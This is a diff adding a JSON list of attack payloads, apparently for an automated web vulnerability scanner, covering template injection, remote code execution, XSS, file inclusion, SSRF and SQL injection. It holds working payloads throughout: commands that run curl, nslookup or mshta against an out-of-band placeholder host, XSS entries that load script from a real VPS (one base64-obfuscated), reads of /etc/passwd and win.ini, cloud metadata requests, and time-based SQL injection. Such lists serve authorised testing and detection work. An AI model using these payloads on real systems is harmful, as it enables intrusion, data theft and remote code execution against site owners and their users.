@@ -1,0 +1,1481 @@
+[
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "}}{% import os %}{{os.system('curl http://[COLLAB]')",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "Volume",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"cmd.exe /c dir\").getInputStream()).useDelimiter(\"\\A\").next()",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "Volume",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"cmd.exe /c dir\").getInputStream()).useDelimiter(\"\\\\A\").next()",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup [COLLAB]')}",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "${req.getServletContext().getAttribute('org.apache.tomcat.InstanceManager').newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval(\"java.lang.Runtime.getRuntime().exec('nslookup [COLLAB]')\")}",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "'\"<script src='https://vps-fa5ba563.vps.ovh.net'></script>",
+        "expectingCollab": false,
+        "category": "XSS-Hunter"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://vps-fa5ba563.vps.ovh.net\\';document.body.appendChild(a)')",
+        "expectingCollab": false,
+        "category": "XSS-Hunter"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "<img src onerror=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdnBzLWZhNWJhNTYzLnZwcy5vdmgubmV0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw\">",
+        "expectingCollab": false,
+        "category": "XSS-Hunter"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "'\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdnBzLWZhNWJhNTYzLnZwcy5vdmgubmV0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw autofocus>",
+        "expectingCollab": false,
+        "category": "XSS-Hunter"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "<scRipT>$.getScript(\"https://vps-fa5ba563.vps.ovh.net\")</scRipT>",
+        "expectingCollab": false,
+        "category": "XSS-Hunter"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "<sc<sCriPt>RipT>$.getScript(\"https://vps-fa5ba563.vps.ovh.net\")</sc</ScrIpt>RipT>",
+        "expectingCollab": false,
+        "category": "XSS-Hunter"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "%24%7bfile:UTF-8:/etc/passwd%7d",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "<xsl:value-of select=\"php:function('file_get_contents', '/etc/passwd')\" />",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "%3Cxsl:value-of%20select=%22php:function('file_get_contents','/etc/passwd')%22%20%2f%3E",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "/etc/passwd",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "${file:UTF-8:/etc/passwd}",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "../../../../../../../../../etc/passwd",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:x:",
+        "expectedDelay": 0,
+        "payload": "{% extends \"/etc/passwd\" %}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "::ffff:[COLLAB]",
+        "expectingCollab": true,
+        "category": "SSRF"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": "hostname",
+        "expectedDelay": 0,
+        "payload": "/core/http://169.254.169.254/metadata/v1",
+        "expectingCollab": false,
+        "category": "SSRF"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": "hostname",
+        "expectedDelay": 0,
+        "payload": "/http://169.254.169.254/metadata/v1",
+        "expectingCollab": false,
+        "category": "SSRF"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 0,
+        "payload": "http://[COLLAB]",
+        "expectingCollab": true,
+        "category": "SSRF"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": false,
+        "expectingResponse": false,
+        "expectedDelay": 10000,
+        "payload": "let delay;if(typeof process!=='undefined'&&process.versions&&process.versions.node){delay=11;}else if(typeof Deno!=='undefined'){delay=12;}else if(typeof window!=='undefined'&&typeof document!=='undefined'){delay=13;}else if(typeof self!=='undefined'&&typeof self.postMessage==='function'&&typeof window==='undefined'){delay=14;}else if(typeof Packages!=='undefined'&&typeof java!=='undefined'){delay=15;}else if(typeof Java!=='undefined'&&typeof Java.type==='function'){delay=16;}else if(typeof Reflect!=='undefined'&&typeof Reflect.parse==='function'){delay=17;}else if(typeof ActiveXObject!=='undefined'||typeof ScriptEngineMajorVersion==='function'){delay=18;}else if(typeof Polyglot!=='undefined'&&typeof Polyglot.eval==='function'){delay=19;}else if(typeof Qt!=='undefined'&&typeof Qt.include==='function'){delay=110;}else if(typeof WebAssembly!=='undefined'&&typeof WebAssembly.Module==='function'){delay=111;}else if(typeof process!=='undefined'&&process.versions&&process.versions.electron){delay=112;}else if(typeof Intl!=='undefined'&&typeof Intl.v8BreakIterator==='function'){delay=113;}else if(typeof callPhantom==='function'){delay=114;}else if(typeof app!=='undefined'&&typeof app.alert==='function'){delay=115;}else if(typeof process!=='undefined'&&typeof process.env==='object'&&typeof process.env.AWS_EXECUTION_ENV!=='undefined'){delay=116;}else if(typeof require==='function'&&typeof module==='object'){delay=117;}else if(typeof navigator!=='undefined'&&typeof navigator.gpu!=='undefined'){delay=118;}else if(typeof jest!=='undefined'&&typeof jest.mock==='function'){delay=119;}else if(typeof navigator!=='undefined'&&typeof navigator.webdriver==='boolean'){delay=120;}else{delay=0;}const start=Date.now();while(Date.now()-start<delay*1000){}",
+        "expectingCollab": false,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "",
+        "expectingTimeDelay": true,
+        "expectingResponse": false,
+        "expectedDelay": 10,
+        "payload": "' or select pg_sleep(10)--+-",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "${script:javascript:java.lang.Runtime.getRuntime().exec('curl [COLLAB]')}",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "for 16-bit app support",
+        "payload": "C:\\windows\\win.ini",
+        "expectingCollab": false,
+        "category": "ALL"
+    },
+    {
+        "expectedDelay": 10,
+        "payload": "'; select 1 from pg_sleep(10)--+-",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedDelay": 10,
+        "payload": "'||pg_sleep(10)--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedDelay": 10,
+        "payload": ",1) AND 6363=(SELECT 6363 FROM PG_SLEEP(10)) AND (1=1",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedDelay": 10,
+        "payload": "1) AND 6363=(SELECT 6363 FROM PG_SLEEP(10)) AND (1=1",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "<%= 4356*16 %>",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "@(4356*16)",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "@{4356*16}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "#{4356*16}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "'%2b#{4356*16}%2b'",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "root:x",
+        "expectingTimeDelay": null,
+        "payload": "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "root:x",
+        "expectingTimeDelay": null,
+        "payload": "{${system(\"cat+/etc/passwd\")}}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(\"curl [COLLAB]\")}",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "${4356*16}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "69696",
+        "expectingTimeDelay": null,
+        "payload": "{{4356*16}}",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "root:x",
+        "expectingTimeDelay": null,
+        "payload": "<%= system(\"cat /etc/passwd\") %>",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": "for 16-bit app support",
+        "expectingTimeDelay": null,
+        "payload": "<%= system(\"type C:/windows/win.ini\") %>",
+        "expectingCollab": false,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<%= system(\"curl [COLLAB]\") %>",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "'%2b#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue((new freemarker.template.utility.Execute()).exec({\"curl [COLLAB]\"}),{})%2b'",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<%= system(\"mshta http://[COLLAB]\") %>",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<script>alert([increment]1[/increment])</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%3Cimg%20src%20onerror%3Dalert(1)%3E",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "#%3Cimg%20src%20onerror%3Dalert(1)%3E",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "#/redirect?url=jAvAsCripT:alert([increment]1[/increment])",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "#/redirect?url=http://sirdarckcat.github.io/xss/img-src.html",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<img_src=x_onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"><svg onload=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%22%3E%3Cscript%3Ealert%28[increment]1[/increment]%29%3C%2Fscript%3E",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "&quot;&gt;&lt;script&gt;alert([increment]1[/increment])&lt;/script&gt;",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<Svg/OnLoad\u200b=alert%25%0A26lpar;[increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "${alert([increment]1[/increment])}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert([increment]1[/increment])+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<svg><a><animate attributeName=href values=javascript:alert([increment]1[/increment]) /><text x=20 y=20>Click me</text></a>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%3Ca%20href=%22%26%2335%3b%22%3E%3Ca%20href=%22%26%23106%3b%26%2397%3b%26%23118%3b%26%2397%3b%26%23115%3b%26%2399%3b%26%23114%3b%26%23105%3b%26%23112%3b%26%23116%3b:%26%2397%3b%26%23108%3b%26%23101%3b%26%23114%3b%26%23116%3b([increment]1[/increment])%22%3EClick%20here%3Cp%20style=%22display:%20none;%22%3E.childrenlist.html/%3Ca%20href=%3E",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%27accesskey=%27x%27onclick=%27alert([increment]1[/increment])",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "1&%27},x=x=%3E{throw/**/onerror=alert,[increment]1[/increment]},toString=x,window%2b%27%27,{x:%27",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "#<img+src+onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "#<img%20src%20onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "#<ScRipT>alert([increment]1[/increment])</ScRipT>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"><img src onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"-alert(1)}//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"><img%20src%20onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"-alert([increment]1[/increment])}//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"onmouseover=\"alert([increment]1[/increment])",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%0d%0ajavascript:alert([increment]1[/increment])",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "'-alert([increment]1[/increment])-'",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\\'-alert([increment]1[/increment])//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "http%3A%2F%2Ffoo%3F%26apos%3B-alert%281%29-%26apos%3B",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "{{$on.constructor('alert([increment]1[/increment])')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\"></object>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)([increment]3[/increment])%27%3E#x';",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\\\"-alert([increment]1[/increment])}//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<><img src onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<><img%20src%20onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"><body onresize=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"><body%20onresize=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "&apos;-alert([increment]1[/increment])-&apos;",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "http://google.com?&apos;-alert([increment]1[/increment])-&apos;",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "</scRipt><scRipt>alert([increment]1[/increment])</scRipt>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "</sc<script>Ript><scR<script>ipt>alert([increment]1[/increment])</scR<script>ipt>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<svg><a><animate attributeName=href values=javascript:alert([increment]1[/increment]) /><text x=20 y=20>Click me</text></a>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "'},x=x=>{throw/**/onerror=alert,[increment]1337[/increment]},toString=x,window+'',{x:'",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert([increment]1[/increment]) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert([increment]1[/increment])//>\\x3e",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*<svg/*/onload=alert([increment]1[/increment])//>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert([increment]1[/increment])//>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert([increment]1[/increment])//>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert([increment]1[/increment])//'>`",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:`/*\\\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ alert([increment]1[/increment])//'\">`",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*'//`//\\\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame */ onload=alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*`/*\\\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert([increment]1[/increment])//</Script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:`</template>\\\"///\"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert([increment]1[/increment])//<</script>`",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*`//'//\\\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg\"///*/ onload=alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"//'//`//\\\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/<svg/*/onload= alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*-->'//\"//`//\\\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/<svg */ onload=alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*'/*`/*\\\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*'/*\\\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame <svg */ onload=alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*`/*'/*\\\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*'//`//\\\"//</title></template/</textarea/</style/</noscript/</noembed/</script>--><<script>alert([increment]1[/increment])<</script><frame/*/ onload=alert([increment]1[/increment])//>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])\"//</title></textarea></style></noscript></noembed></template></script>\\\"//'//`//--><script>//<svg <frame */onload= alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*`/*'/*\\\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert([increment]1[/increment])--><<svg/*/ onload=alert([increment]1[/increment])//>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"></select><img%20src=1%20onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "\"><xss+id%3dx+onfocus%3dalert([increment]1[/increment])+tabindex%3d1>#x",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*`/*\\\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert([increment]1[/increment])//--><<sVg/onload=alert``>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*--></script></textarea></style></noscript>\\\"</noembed>[`</template>[\"</select>['</title>]<<script>///<frame */ onload=alert([increment]1[/increment])//<</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*\\\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert([increment]1[/increment])><<svg/onload= /**/alert([increment]1[/increment])//>",
+        "expectingCollab": false,
